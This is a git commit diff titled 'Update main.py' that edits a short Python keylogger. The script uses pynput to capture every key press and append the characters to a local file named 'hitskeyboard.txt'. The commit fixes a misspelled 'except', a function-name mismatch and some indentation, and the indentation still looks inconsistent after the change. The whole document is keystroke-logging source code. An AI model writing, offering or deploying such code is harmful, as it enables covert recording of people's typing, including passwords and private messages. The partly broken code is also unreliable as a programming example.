7106f71e8a9b30342803bc8b3284dfd9e896ca3a
Hmqg <87581543+hmqg@users.noreply.github.com>
2024-06-13 08:54:01 +0200

    Update main.py

--- main.py
+++ main.py
@@ -3,13 +3,14 @@ from pynput  import keyboard
 def  keypressed(key) :
      print (str(key))
      with open("hitskeyboard.txt", 'a') as logKey:
-        try:
+      try:
            char = key.char 
            logKey.write(char)
-           exept:
+      except:
            print("Error")
 
 if  __name__ == "__main__":
-    listener = keyboard.Listener(on_press=keyPressed)
+    listener = keyboard.Listener(on_press=keypressed)
     listener.start()
     input()
+    
